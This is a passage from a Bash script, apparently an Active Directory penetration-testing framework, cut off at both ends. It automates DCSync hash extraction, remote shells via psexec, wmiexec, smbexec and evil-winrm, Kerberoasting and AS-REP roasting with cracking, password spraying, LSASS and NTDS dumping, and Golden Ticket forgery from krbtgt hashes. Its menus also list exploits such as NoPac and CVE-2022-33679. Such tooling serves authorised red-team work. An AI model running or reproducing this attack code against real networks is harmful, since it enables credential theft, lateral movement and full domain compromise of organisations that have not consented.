impacket${NC}\"\n    else\n        gethash_nt=\"\"\n        gethash_aes=\"\"\n        if [ ! -f \"${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt\" ]; then\n            echo -e \"${BLUE}[*] Extracting NTLM hash and AES keys of ${gethash_user}${NC}\"\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] DCSync requires credentials${NC}\"\n            else\n                run_command \"${impacket_secretsdump} ${argument_imp}\\\\@${target} -just-dc-user $(echo \"${domain}\" | cut -d \".\" -f 1)/${gethash_user}\" | tee \"${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt\"\n            fi\n        else\n            echo -e \"${YELLOW}[i] Hash file of ${gethash_user} found, skipping... ${NC}\"\n        fi\n        gethash_nt=$(grep \"${gethash_user}\" \"${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt\" | grep -v \"aes\\|des\" | cut -d \":\" -f 4)\n        gethash_aes=$(grep \"aes256\" \"${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt\" | cut -d \":\" -f 3)\n    fi\n    echo -e \"\"\n}\n\n###### cmd_exec: Open CMD Console\nsmbexec_console() {\n    if [ ! -f \"${impacket_smbexec}\" ]; then\n        echo -e \"${RED}[-] smbexec.py not found! Please verify the installation of impacket ${NC}\"\n    elif [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] smbexec requires credentials${NC}\"\n    else\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}\"\n        read -rp \">> \" smbexec_target </dev/tty\n        while [ \"${smbexec_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" smbexec_target </dev/tty\n        done\n        echo -e \"${BLUE}[*] Opening smbexec.py console on target: $smbexec_target ${NC}\"\n        run_command \"${impacket_smbexec} ${argument_imp}\\\\@${smbexec_target}\" 2>&1 | tee -a \"${output_dir}/CommandExec/impacket_smbexec_output.txt\"\n    fi\n    echo -e \"\"\n}\n\nwmiexec_console() {\n    if [ ! -f \"${impacket_wmiexec}\" ]; then\n        echo -e \"${RED}[-] wmiexec.py not found! Please verify the installation of impacket ${NC}\"\n    elif [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] wmiexec requires credentials${NC}\"\n    else\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}\"\n        read -rp \">> \" wmiexec_target </dev/tty\n        while [ \"${wmiexec_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" wmiexec_target </dev/tty\n        done\n        echo -e \"${BLUE}[*] Opening wmiexec.py console on target: $wmiexec_target ${NC}\"\n        run_command \"${impacket_wmiexec} ${argument_imp}\\\\@${wmiexec_target}\" 2>&1 | tee -a \"${output_dir}/CommandExec/impacket_wmiexec_output.txt\"\n    fi\n    echo -e \"\"\n}\n\npsexec_console() {\n    if [ ! -f \"${impacket_psexec}\" ]; then\n        echo -e \"${RED}[-] psexec.py not found! Please verify the installation of impacket ${NC}\"\n    elif [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] psexec requires credentials${NC}\"\n    else\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}\"\n        read -rp \">> \" psexec_target </dev/tty\n        while [ \"${psexec_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" psexec_target </dev/tty\n        done\n        echo -e \"${BLUE}[*] Opening psexec.py console on target: $psexec_target ${NC}\"\n        run_command \"${impacket_psexec} ${argument_imp}\\\\@${psexec_target}\" 2>&1 | tee -a \"${output_dir}/CommandExec/impacket_psexec_output.txt\"\n    fi\n    echo -e \"\"\n}\n\nevilwinrm_console() {\n    if [ ! -f \"${evilwinrm}\" ]; then\n        echo -e \"${RED}[-] evilwinrm not found! Please verify the installation of evilwinrm ${NC}\"\n    elif [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] evilwinrm requires credentials${NC}\"\n    else\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}\"\n        read -rp \">> \" evilwinrm_target </dev/tty\n        while [ \"${evilwinrm_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" evilwinrm_target </dev/tty\n        done\n        echo -e \"${BLUE}[*] Opening evilwinrm console on target: $evilwinrm_target ${NC}\"\n        run_command \"${evilwinrm} -i ${evilwinrm_target} ${argument_evilwinrm}\" 2>&1 | tee -a \"${output_dir}/CommandExec/impacket_evilwinrm_output.txt\"\n    fi\n    echo -e \"\"\n}\n\nad_enum() {\n    mkdir -p \"${output_dir}/DomainRecon\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        ldapdomaindump_enum\n        enum4linux_enum\n        ne_gpp\n        ne_smb_enum\n        windapsearch_enum\n    else\n        bhd_enum\n        ldapdomaindump_enum\n        enum4linux_enum\n        ne_gpp\n        ne_smb_enum\n        ne_ldap_enum\n        deleg_enum\n        bloodyad_all_enum\n        bloodyad_write_enum\n        windapsearch_enum\n        ldapwordharv_enum\n        rdwatool_enum\n        ne_sccm\n        sccmhunter_enum\n        GPOwned_enum\n    fi\n}\n\nadcs_enum() {\n    mkdir -p \"${output_dir}/ADCS\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        ne_adcs_enum\n    else\n        ne_adcs_enum\n        certi_py_enum\n        certipy_enum\n        certifried_check\n    fi\n}\n\nbruteforce() {\n    mkdir -p \"${output_dir}/BruteForce\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        ridbrute_attack\n        kerbrute_enum\n        userpass_kerbrute_check\n        ne_pre2k\n    else\n        userpass_kerbrute_check\n        ne_pre2k\n    fi\n}\n\nkerberos() {\n    mkdir -p \"${output_dir}/Kerberos\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        asrep_attack\n        kerberoast_attack\n        asreprc4_attack\n        john_crack_asrep\n        john_crack_kerberoast\n    else\n        asrep_attack\n        kerberoast_attack\n        john_crack_asrep\n        john_crack_kerberoast\n        nopac_check\n        ms14-068_check\n    fi\n}\n\nscan_shares() {\n    mkdir -p \"${output_dir}/Shares\"\n    smb_map\n    ne_shares\n    ne_spider\n    finduncshar_scan\n}\n\nvuln_checks() {\n    mkdir -p \"${output_dir}/Vulnerabilities\"\n    zerologon_check\n    ms17-010_check\n    spooler_check\n    printnightmare_check\n    webdav_check\n    coerceplus_check\n    smbsigning_check\n    ntlmv1_check\n    runasppl_check\n    rpcdump_check\n    ldapnightmare_check\n}\n\nmssql_checks() {\n    mkdir -p \"${output_dir}/MSSQL\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${RED}MSSQL checks requires credentials.${NC}\"\n    else\n        mssql_enum\n        mssql_relay_check\n    fi\n}\n\npwd_dump() {\n    mkdir -p \"${output_dir}/Credentials\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${RED}Password dump requires credentials.${NC}\"\n    else\n        laps_dump\n        gmsa_dump\n        secrets_dump\n        nanodump_dump\n        dpapi_dump\n        juicycreds_dump\n    fi\n}\n\nprint_info() {\n    echo -e \"${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}, KRB ${dc_port_88}, RDP ${dc_port_3389}, WinRM ${dc_port_5985}\"\n    echo -e \"${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} User wordlist file: ${YELLOW}${user_wordlist}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Password wordlist file: ${YELLOW}${pass_wordlist}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Attacker's IP: ${YELLOW}${attacker_IP}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Attacker's Interface: ${YELLOW}${attacker_interface}${NC}\"\n    echo -e \"${YELLOW}[i]${NC} Current target(s): ${YELLOW}${curr_targets} ${custom_servers}${custom_ip}${NC}\"\n}\n\nmodify_target() {\n    echo -e \"\"\n    echo -e \"${YELLOW}[Modify target(s)]${NC} Please choose from the following options:\"\n    echo -e \"------------------------------------------------------------\"\n    echo -e \"${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}\"\n    echo -e \"1) Domain Controllers\"\n    echo -e \"2) All domain servers\"\n    echo -e \"3) File containing list of servers\"\n    echo -e \"4) IP or hostname\"\n    echo -e \"back) Go back\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    1)\n        curr_targets=\"Domain Controllers\"\n        custom_servers=\"\"\n        custom_ip=\"\"\n        ;;\n\n    2)\n        curr_targets=\"All domain servers\"\n        custom_servers=\"\"\n        custom_ip=\"\"\n        dns_enum\n        ;;\n\n    3)\n        curr_targets=\"File containing list of servers\"\n        custom_servers=\"\"\n        custom_ip=\"\"\n        custom_target_scanned=false\n        /bin/rm \"${custom_servers_list}\" 2>/dev/null\n        read -rp \">> \" custom_servers </dev/tty\n        /bin/cp \"$custom_servers\" \"${custom_servers_list}\" 2>/dev/null\n        while [ ! -s \"${custom_servers_list}\" ]; do\n            echo -e \"${RED}Invalid servers list.${NC} Please specify file containing list of target servers:\"\n            read -rp \">> \" custom_servers </dev/tty\n            /bin/cp \"$custom_servers\" \"${custom_servers_list}\" 2>/dev/null\n        done\n        ;;\n\n    4)\n        curr_targets=\"IP or hostname\"\n        custom_servers=\"\"\n        custom_ip=\"\"\n        custom_target_scanned=false\n        /bin/rm \"${custom_servers_list}\" 2>/dev/null\n        read -rp \">> \" custom_ip </dev/tty\n        echo -n \"$custom_ip\" >\"${custom_servers_list}\" 2>/dev/null\n        while [ ! -s \"${custom_servers_list}\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" custom_ip </dev/tty\n            echo -n \"$custom_ip\" >\"${custom_servers_list}\" 2>/dev/null\n        done\n        ;;\n\n    back) ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        modify_target\n        ;;\n    esac\n}\n\nset_attackerIP() {\n    echo -e \"Please choose the attacker's IPs from the following options:\"\n    attacker_IPlist=(\"$(/usr/bin/hostname -I)\")\n    for ip in \"${attacker_IPlist[@]}\"; do\n        echo -e \"${YELLOW}${ip}${NC}\"\n    done\n    attacker_IP=\"\"\n    read -rp \">> \" attacker_IP </dev/tty\n    for ip in \"${attacker_IPlist[@]}\"; do\n        if [[ \"$ip\" == \"$attacker_IP\" ]]; then\n            matched=true\n        fi\n    done\n    while [[ $matched == true ]]; do\n        echo -e \"${RED}Invalid IP.${NC} Please specify your IP from the list\"\n        read -rp \">> \" attacker_IP </dev/tty\n        for val in \"${attacker_IPlist[@]}\"; do\n            if [[ \"$val\" == \"$attacker_IP\" ]]; then\n                matched=true\n            fi\n        done\n    done\n}\n\npkinit_auth() {\n    current_dir=$(pwd)\n    cd \"${output_dir}/Credentials\" || exit\n    if [[ \"${pfxpass}\" == \"\" ]]; then\n        run_command \"${certipy} auth -pfx '${pfxcert}' -dc-ip ${dc_ip} -username '${user}' -domain ${domain}\" | tee \"${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt\"\n    else\n        echo -e \"${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}\"\n        run_command \"${certipy} cert -export -pfx $(realpath \"$pfxcert\") -password $pfxpass -out '${user}_unprotected.pfx'\" | tee \"${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt\"\n        run_command \"${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip} -username '${user}' -domain ${domain}\" | tee -a \"${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt\"\n    fi\n    hash=$(grep \"Got hash for\" \"${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt\" | cut -d \":\" -f 2,3| cut -d \" \" -f 2)\n    echo -e \"${GREEN}[+] NTLM hash extracted:${NC} $hash\"\n    cd \"${current_dir}\" || exit\n}\n\nget_domain_sid() {\n    sid_domain=$(grep -o \"Domain SID.*\" \"${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt\" 2>/dev/null | head -n 1 | cut -d \" \" -f 3)\n    if [[ ${sid_domain} == \"\" ]]; then\n        run_command \"${netexec} ldap ${target} ${argument_ne} --get-sid | tee ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt\" >/dev/null\n        sid_domain=$(grep -o \"Domain SID.*\" \"${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt\" | head -n 1 | cut -d \" \" -f 3)\n    fi\n    echo -e \"${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}\"\n}\n\nad_menu() {\n    mkdir -p \"${output_dir}/DomainRecon\"\n    echo -e \"\"\n    echo -e \"${CYAN}[AD Enum menu]${NC} Please choose from the following options:\"\n    echo -e \"--------------------------------------------------------\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"A) ACTIVE DIRECTORY ENUMERATIONS #3-4-5-6-14\"\n    else\n        echo -e \"A) ACTIVE DIRECTORY ENUMERATIONS #1-3-4-5-6-7-8-9-10-14-15-16-17-20\"\n    fi\n    echo -e \"1) BloodHound Enumeration using all collection methods (Noisy!)\"\n    echo -e \"2) BloodHound Enumeration using DCOnly\"\n    echo -e \"1bis) BloodHoundCE Enumeration using all collection methods (Noisy!)\"\n    echo -e \"2bis) BloodHoundCE Enumeration using DCOnly\"\n    echo -e \"3) ldapdomaindump LDAP Enumeration\"\n    echo -e \"4) enum4linux-ng LDAP-MS-RPC Enumeration\"\n    echo -e \"5) GPP Enumeration using netexec\"\n    echo -e \"6) MS-RPC Enumeration using netexec (Users, pass pol)\"\n    echo -e \"7) LDAP Enumeration using netexec (Users, passnotreq, userdesc, maq, ldap-checker, subnets)\"\n    echo -e \"8) Delegation Enumeration using findDelegation and netexec\"\n    echo -e \"9) bloodyAD All Enumeration\"\n    echo -e \"10) bloodyAD write rights Enumeration\"\n    echo -e \"11) bloodyAD query DNS server\"\n    echo -e \"12) SilentHound LDAP Enumeration\"\n    echo -e \"13) ldeep LDAP Enumeration\"\n    echo -e \"14) windapsearch LDAP Enumeration\"\n    echo -e \"15) LDAP Wordlist Harvester\"\n    echo -e \"16) LDAP Enumeration using LDAPPER\"\n    echo -e \"17) Adalanche Enumeration\"\n    echo -e \"18) GPO Enumeration using GPOwned\"\n    echo -e \"19) Enumeration of RDWA servers\"\n    echo -e \"20) SCCM Enumeration using netexec\"\n    echo -e \"21) SCCM Enumeration using sccmhunter\"\n    echo -e \"22) Open p0dalirius' LDAP Console\"\n    echo -e \"23) Open p0dalirius' LDAP Monitor\"\n    echo -e \"24) Open garrettfoster13's ACED console\"\n    echo -e \"25) Open LDAPPER custom options\"\n    echo -e \"26) Open breads console\"\n    echo -e \"27) Run godap console\"\n    echo -e \"28) Run adPEAS enumerations\"\n    echo -e \"29) Run ADCheck enumerations\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        ad_enum\n        ad_menu\n        ;;\n\n    1)\n        bhd_enum\n        ad_menu\n        ;;\n\n    2)\n        bhd_enum_dconly\n        ad_menu\n        ;;\n\n    1bis)\n        bhdce_enum\n        ad_menu\n        ;;\n\n    2bis)\n        bhdce_enum_dconly\n        ad_menu\n        ;;\n\n    3)\n        ldapdomaindump_enum\n        ad_menu\n        ;;\n\n    4)\n        enum4linux_enum\n        ad_menu\n        ;;\n\n    5)\n        ne_gpp\n        ad_menu\n        ;;\n\n    6)\n        ne_smb_enum\n        ad_menu\n        ;;\n\n    7)\n        ne_ldap_enum\n        ad_menu\n        ;;\n\n    8)\n        deleg_enum\n        ad_menu\n        ;;\n\n    9)\n        bloodyad_all_enum\n        ad_menu\n        ;;\n\n    10)\n        bloodyad_write_enum\n        ad_menu\n        ;;\n\n    11)\n        bloodyad_dnsquery\n        ad_menu\n        ;;\n\n    12)\n        silenthound_enum\n        ad_menu\n        ;;\n\n    13)\n        ldeep_enum\n        ad_menu\n        ;;\n\n    14)\n        windapsearch_enum\n        ad_menu\n        ;;\n\n    15)\n        ldapwordharv_enum\n        ad_menu\n        ;;\n\n    16)\n        ldapper_enum\n        ad_menu\n        ;;\n\n    17)\n        adalanche_enum\n        ad_menu\n        ;;\n\n    18)\n        GPOwned_enum\n        ad_menu\n        ;;\n\n    19)\n        rdwatool_enum\n        ad_menu\n        ;;\n\n    20)\n        ne_sccm\n        ad_menu\n        ;;\n\n    21)\n        sccmhunter_enum\n        ad_menu\n        ;;\n\n    22)\n        ldap_console\n        ad_menu\n        ;;\n\n    23)\n        ldap_monitor\n        ad_menu\n        ;;\n\n    24)\n        aced_console\n        ad_menu\n        ;;\n\n    25)\n        ldapper_console\n        ad_menu\n        ;;\n\n    26)\n        breads_console\n        ad_menu\n        ;;\n\n    27)\n        godap_console\n        ad_menu\n        ;;\n\n    28)\n        adpeas_enum\n        ad_menu\n        ;;\n\n    29)\n        adcheck_enum\n        ad_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        ad_menu\n        ;;\n    esac\n}\n\nadcs_menu() {\n    mkdir -p \"${output_dir}/ADCS\"\n    echo -e \"\"\n    echo -e \"${CYAN}[ADCS menu]${NC} Please choose from the following options:\"\n    echo -e \"-----------------------------------------------------\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"A) ADCS ENUMERATIONS #1\"\n    else\n        echo -e \"A) ADCS ENUMERATIONS #1-2-3-4\"\n    fi\n    echo -e \"1) ADCS Enumeration using netexec\"\n    echo -e \"2) certi.py ADCS Enumeration\"\n    echo -e \"3) Certipy ADCS Enumeration\"\n    echo -e \"4) Certifried check\"\n    echo -e \"5) Certipy LDAP shell via Schannel (using Certificate Authentication)\"\n    echo -e \"6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)\"\n    echo -e \"7) Dump LSASS using masky\"\n    echo -e \"8) Dump NTDS using certsync\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        adcs_enum\n        adcs_menu\n        ;;\n\n    1)\n        ne_adcs_enum\n        adcs_menu\n        ;;\n\n    2)\n        certi_py_enum\n        adcs_menu\n        ;;\n\n    3)\n        certipy_enum\n        adcs_menu\n        ;;\n\n    4)\n        certifried_check\n        adcs_menu\n        ;;\n\n    5)\n        certipy_ldapshell\n        adcs_menu\n        ;;\n\n    6)\n        certipy_ca_dump\n        adcs_menu\n        ;;\n\n    7)\n        masky_dump\n        adcs_menu\n        ;;\n\n    8)\n        certsync_ntds_dump\n        adcs_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        adcs_menu\n        ;;\n    esac\n}\n\nbruteforce_menu() {\n    mkdir -p \"${output_dir}/BruteForce\"\n    echo -e \"${CYAN}[BruteForce menu]${NC} Please choose from the following options:\"\n    echo -e \"----------------------------------------------------------\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"A) BRUTEFORCE ATTACKS #1-2-3-5\"\n    else\n        echo -e \"A) BRUTEFORCE ATTACKS #3-5\"\n    fi\n    echo -e \"1) RID Brute Force (Null session) using netexec\"\n    echo -e \"2) User Enumeration using kerbrute (Null session)\"\n    echo -e \"3) User=Pass check using kerbrute (Noisy!)\"\n    echo -e \"4) User=Pass check using netexec (Noisy!)\"\n    echo -e \"5) Identify Pre-Created Computer Accounts using netexec (Noisy!)\"\n    echo -e \"6) Pre2k computers authentication check (Noisy!)\"\n    echo -e \"7) User Enumeration using ldapnomnom (Null session)\"\n    echo -e \"8) Password spraying using kerbrute (Noisy!)\"\n    echo -e \"9) Password spraying using netexec - ldap (Noisy!)\"\n    echo -e \"10) Timeroast attack against NTP\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        bruteforce\n        bruteforce_menu\n        ;;\n\n    1)\n        ridbrute_attack\n        bruteforce_menu\n        ;;\n\n    2)\n        kerbrute_enum\n        bruteforce_menu\n        ;;\n\n    3)\n        userpass_kerbrute_check\n        bruteforce_menu\n        ;;\n\n    4)\n        userpass_ne_check\n        bruteforce_menu\n        ;;\n\n    5)\n        ne_pre2k\n        bruteforce_menu\n        ;;\n\n    6)\n        pre2k_check\n        bruteforce_menu\n        ;;\n\n    7)\n        ldapnomnom_enum\n        bruteforce_menu\n        ;;\n\n    8)\n        kerbrute_passpray\n        bruteforce_menu\n        ;;\n\n    9)\n        ne_passpray\n        bruteforce_menu\n        ;;\n\n    10)\n        ne_timeroast\n        bruteforce_menu\n        ;;\n\n    back)\n        main_menu\n        ;;\n\n    exit)\n        exit 1\n        ;;\n\n    *)\n        echo -e \"${RED}[-] Unknown option ${option_selected}... ${NC}\"\n        echo -e \"\"\n        bruteforce_menu\n        ;;\n    esac\n}\n\nkerberos_menu() {\n    mkdir -p \"${output_dir}/Kerberos\"\n    echo -e \"\"\n    echo -e \"${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:\"\n    echo -e \"-----------------------------------------------------------------\"\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"A) KERBEROS ATTACKS #1-2-3-4-7\"\n    else\n        echo -e \"A) KERBEROS ATTACKS #1-2-3-4-5-6\"\n    fi\n    echo -e \"1) AS REP Roasting Attack using GetNPUsers\"\n    echo -e \"2) Kerberoast Attack using GetUserSPNs\"\n    echo -e \"3) Cracking AS REP Roast hashes using john the ripper\"\n    echo -e \"4) Cracking Kerberoast hashes using john the ripper\"\n    echo -e \"5) NoPac check using netexec (only on DC)\"\n    echo -e \"6) MS14-068 check (only on DC)\"\n    echo -e \"7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)\"\n    echo -e \"8) AP-REQ hijack with DNS unsecure updates abuse using krbjack\"\n    echo -e \"9) Run custom Kerberoast attack using Orpheus\"\n    echo -e \"10) Request TGS for current user (requires: authenticated)\"\n    echo -e \"11) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)\"\n    echo -e \"12) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)\"\n    echo -e \"13) Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')\"\n    echo -e \"14) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)\"\n    echo -e \"15) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)\"\n    echo -e \"16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)\"\n    echo -e \"17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')\"\n    echo -e \"back) Go back\"\n    echo -e \"exit) Exit\"\n\n    read -rp \"> \" option_selected </dev/tty\n\n    case ${option_selected} in\n    A)\n        kerberos\n        kerberos_menu\n        ;;\n\n    1)\n        asrep_attack\n        kerberos_menu\n        ;;\n\n    2)\n        kerberoast_attack\n        kerberos_menu\n        ;;\n\n    3)\n        john_crack_asrep\n        kerberos_menu\n        ;;\n\n    4)\n        john_crack_kerberoast\n        kerberos_menu\n        ;;\n\n    5)\n        nopac_check\n        kerberos_menu\n        ;;\n\n    6)\n        ms14-068_check\n        kerberos_menu\n        ;;\n\n    7)\n        asreprc4_attack\n        kerberos_menu\n        ;;\n\n    8)\n        krbjack_attack\n        kerberos_menu\n        ;;\n\n    9)\n        kerborpheus_attack\n        kerberos_menu\n        ;;\n\n    10)\n        if [ ! -f \"${impacket_getST}\" ]; then\n            echo -e \"${RED}[-] getST.py not found! Please verify the installation of impacket${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${RED}[-] Requesting ticket using getST requires credentials${NC}\"\n            else\n                tick_spn=\"CIFS/${dc_FQDN}\"\n                echo -e \"${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_FQDN}):${NC}\"\n                read -rp \">> \" tick_spn_value </dev/tty\n                if [[ ! ${tick_spn_value} == \"\" ]]; then tick_spn=\"${tick_spn_value}\"; fi\n                echo -e \"${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_getST} ${argument_imp} -dc-ip ${dc_ip} -spn ${tick_spn}\" | tee -a \"${output_dir}/Credentials/getST_output_${dc_domain}\"\n                ticket_ccache_out=\"${user}@$(echo \"${tick_spn}\" | sed 's/\\//_/g')@${dc_domain^^}.ccache\"\n                ticket_kirbi_out=\"${user}@$(echo \"${tick_spn}\" | sed 's/\\//_/g')@${dc_domain^^}.kirbi\"\n                run_command \"${impacket_ticketconverter} './${ticket_ccache_out}' './${ticket_kirbi_out}'\"\n                cd \"${current_dir}\" || exit\n                if [ -f \"${output_dir}/Credentials/${ticket_ccache_out}\" ]; then\n                    echo -e \"${GREEN}[+] TGS for SPN ${tick_spn} generated successfully:${NC}\"\n                    echo -e \"'${output_dir}/Credentials/${ticket_ccache_out}'\"\n                    echo -e \"'${output_dir}/Credentials/${ticket_kirbi_out}'\"\n                else\n                    echo -e \"${RED}[-] Failed to request ticket${NC}\"\n                fi\n            fi\n\n        fi\n        kerberos_menu\n        ;;\n    \n    11)\n        if [ ! -f \"${impacket_ticketer}\" ]; then\n            echo -e \"${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}\"\n        else\n            echo -e \"${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:\"\n            read -rp \">> \" rc4_or_aes </dev/tty\n            while [ \"${rc4_or_aes}\" != \"RC4\" ] && [ \"${rc4_or_aes}\" != \"AES\" ]; do\n                echo -e \"${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':\"\n                read -rp \">> \" rc4_or_aes </dev/tty\n            done\n            gethash_user=\"krbtgt\"\n            gethash_hash=\"\"\n            echo -e \"${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):${NC}\"\n            read -rp \">> \" gethash_hash </dev/tty\n            if [[ ${gethash_hash} == \"\" ]]; then\n                get_hash\n            else\n                if [[ ${rc4_or_aes} == \"RC4\" ]]; then gethash_nt=\"$gethash_hash\"; else gethash_aes=\"$gethash_hash\"; fi\n            fi\n\n            if [[ ${gethash_nt} == \"\" ]] && [[ ${gethash_aes} == \"\" ]]; then\n                echo -e \"${RED}[-] Failed to extract hash of ${gethash_user}${NC}\"\n            else\n                if [[ ${rc4_or_aes} == \"RC4\" ]]; then gethash_key=\"-nthash ${gethash_nt}\"; else gethash_key=\"-aesKey ${gethash_aes}\"; fi\n\n                tick_randuser=\"Administrator\"\n                tick_user_id=\"\"\n                tick_groups=\"\"\n                echo -e \"${BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):${NC}\"\n                read -rp \">> \" tick_randuser_value </dev/tty\n                if [[ ! ${tick_randuser_value} == \"\" ]]; then tick_randuser=\"${tick_randuser_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify custom user id (press Enter to skip):${NC}\"\n                read -rp \">> \" tick_user_id_value </dev/tty\n                if [[ ! ${tick_user_id_value} == \"\" ]]; then tick_user_id=\"-user-id ${tick_user_id_value}\"; fi\n                echo -e \"${BLUE}[*] Please specify comma separated custom groups ids (press Enter to skip):${NC}\"\n                echo -e \"${CYAN}[*] Example: 512,513,518,519,520 ${NC}\"\n                read -rp \">> \" tick_group_ids_value </dev/tty\n                if [[ ! ${tick_group_ids_value} == \"\" ]]; then tick_groups=\"-groups ${tick_group_ids_value}\"; fi\n                get_domain_sid\n                while [[ \"${sid_domain}\" == \"\" ]]; do\n                    echo -e \"${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}\"\n                    echo -e \"${CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}\"\n                    read -rp \">> \" sid_domain </dev/tty\n                done\n                echo -e \"${CYAN}[*] Generating golden ticket...${NC}\"\n                current_dir=$(pwd)\n                cd \"${output_dir}/Credentials\" || exit\n                run_command \"${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}\"\n                run_command \"${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi\"\n                /bin/mv 